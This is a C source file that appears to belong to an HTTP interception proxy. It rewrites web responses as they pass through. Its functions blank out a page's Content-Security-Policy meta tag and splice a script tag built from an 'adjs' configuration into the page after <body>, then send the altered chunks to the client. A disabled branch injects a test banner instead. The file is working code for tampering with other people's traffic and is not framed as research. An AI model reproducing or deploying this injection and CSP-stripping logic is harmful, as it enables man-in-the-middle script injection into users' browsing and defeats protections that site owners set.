#include "includes.h"

#define script_struct(script, script_buf_size, jsparam) { \
	snprintf( \
		script, script_buf_size, \
		"%s%s%s%s?%s%s%s", \
		adjs.script_h, \
		adjs.script_id, \
		adjs.script_m, \
		adjs.js, \
		adjs.jsUrl_mark, \
		jsparam, \
		adjs.script_e \
	); \
}

int deleteSecurityPolicy(char *addr, char *start, int len);

char *findSecurityPolicyAddr(char *context, int text_len)
{
	if (context == NULL || text_len <= 0)
	{
		return NULL;
	}
	char *ptext = context;
	char *p_str1 = "http-equiv=\"Content-Security-Policy\"";
	int strlen1 = strlen(p_str1);

	char *addr = NULL;
	
	int offset = find_str(ptext, text_len, p_str1, strlen1);
	if (offset < 0)
	{
		return NULL;
	}
	addr = ptext + offset;

	deleteSecurityPolicy(addr, context, context + text_len - addr);

	return ptext;
}

int deleteSecurityPolicy(char *addr, char *start, int len)
{
	int i = 0;
	char *p = addr;
	for (i = 0; *(p - i) != '<' && (p - i) >= start; i ++);
	p = p - i;
	if (p < start)
		return -1;
	char *q = addr;
	for (i = 0; q[i] != '>' && i < len; i ++);
	if (i >= len)
		return -1;
	q = q + i;
	memset(p, ' ', q - p + 1);
	return 0;
}

int find_http_body(char * psrc, int src_len)
{
	int offset= 0;
	int len = 5;
	char *psrctmp = psrc;
	offset = find_str_case(psrc, src_len, "<body", len);
	if (offset < 0) {
		return -1;
	}

	offset += 5;
	psrctmp += offset;
	src_len -= offset;
	offset = find_str(psrctmp, src_len, ">", 1);
	if (offset < 0) {
		return -2;
	}

	psrctmp += offset + 1;
	return psrctmp - psrc;
}

int js_inject2(int sockfd, char **psrc, int *srclen, char *url, int url_len, 
	char *title, int title_len, char *keyword, int keyword_len, char jsin_flag, char *policy_flag)
{
	if (! jsin_flag)
		return 0;

	int send_len = 0;
	
	findSecurityPolicyAddr(*psrc, *srclen);
	
	int size = GET_JS_JSON_PARMA_BUF_SIZE(url_len);
	char *jsparam = NULL;
	int jsparamlen = 0;

	char *script = NULL;

	while (1)
	{
		int offset = find_http_body(*psrc, *srclen);
		if (offset < 0)
		{
			break;
		}

		if (! jsparam)
		{
			jsparam = calloc(1, size);
			if (! jsparam)
			{
				break;
			}

			jsparamlen = struct_js_aes_parma(sockfd, jsparam, size, url, url_len);
			if (jsparamlen <= 0)
			{
				jsparamlen = 0;
			}
			
			jsparam[jsparamlen] = '\0';
		}
		

#if 1
		int jscodelen = adjs.script_h_len 
					+ adjs.script_id_len 
					+ adjs.script_m_len 
					+ adjs.js_len 
					+ adjs.jsUrl_mark_len + 1
					+ jsparamlen 
					+ adjs.script_e_len + 1;

		if (! script)
		{
			script = calloc(1, jscodelen);
			if (! script)
			{
				break;
			}

			script_struct(script, jscodelen, jsparam);
		}
		
		send_len = offset;
		char chunked_size[20];
		sprintf(chunked_size, "%x\r\n", send_len + jscodelen);
		SEND_DATA(sockfd, chunked_size, strlen(chunked_size));
		SEND_DATA(sockfd, *psrc, send_len);
		SEND_DATA(sockfd, script, jscodelen);
		SEND_DATA(sockfd, "\r\n", 2);
		*srclen -= send_len;
		*psrc += send_len;
#else
		char *test = "<div style=\"width: 100%;height: 130px;background-color:#EA8179;position: fixed;bottom:0;left:0;z-index:2147483647;color:white;\"><span style=\"font-size:18px;border:1px solid blue;vertical-align: middle;\">21474</span>sss83647</div>";
		send_len = offset;
		char chunked_size[20];
		sprintf(chunked_size, "%x\r\n", send_len + strlen(test));
		SEND_DATA(sockfd, chunked_size, strlen(chunked_size));
		SEND_DATA(sockfd, *psrc, send_len);
		SEND_DATA(sockfd, test, strlen(test));
		SEND_DATA(sockfd, "\r\n", 2);
		*srclen -= send_len;
		*psrc += send_len;
#endif
	}
	
	free_malloc(jsparam);
	free_malloc(script);
	
	return 0;
}

int js_inject3(int sockfd, char **psrc, int *srclen, char *url, int url_len, 
	char *title, int title_len, char *keyword, int keyword_len, char jsin_flag, char *policy_flag)
{
	if (! jsin_flag)
		return 0;

	int send_len = 0;
	
	findSecurityPolicyAddr(*psrc, *srclen);

	int size = GET_JS_JSON_PARMA_BUF_SIZE(url_len);
	char *jsparam = NULL;
	int jsparamlen = 0;
	char *script = NULL;

	while (1)
	{
		int offset = find_http_body(*psrc, *srclen);
		if (offset < 0)
		{
			break;
		}
		
		if (! jsparam)
		{
			jsparam = calloc(1, size);
			if (! jsparam)
			{
				break;
			}
			
			jsparamlen = struct_js_aes_parma(sockfd, jsparam, size, url, url_len);
			if (jsparamlen <= 0)
			{
				jsparamlen = 0;
			}
			
			jsparam[jsparamlen] = '\0';
		}
		
#if 1
		int jscodelen = adjs.script_h_len 
					+ adjs.script_id_len 
					+ adjs.script_m_len 
					+ adjs.js_len 
					+ adjs.jsUrl_mark_len + 1 
					+ jsparamlen 
					+ adjs.script_e_len + 1;

		if (! script)
		{
			script = calloc(1, jscodelen);
			if (! script)
			{
				break;
			}

			script_struct(script, jscodelen, jsparam);
		}

		send_len = offset;
		SEND_DATA(sockfd, *psrc, send_len);
		SEND_DATA(sockfd, script, jscodelen);
		*srclen -= send_len;
		*psrc += send_len;
#else
#endif
	}

	free_malloc(jsparam);
	free_malloc(script);

	return 0;
}


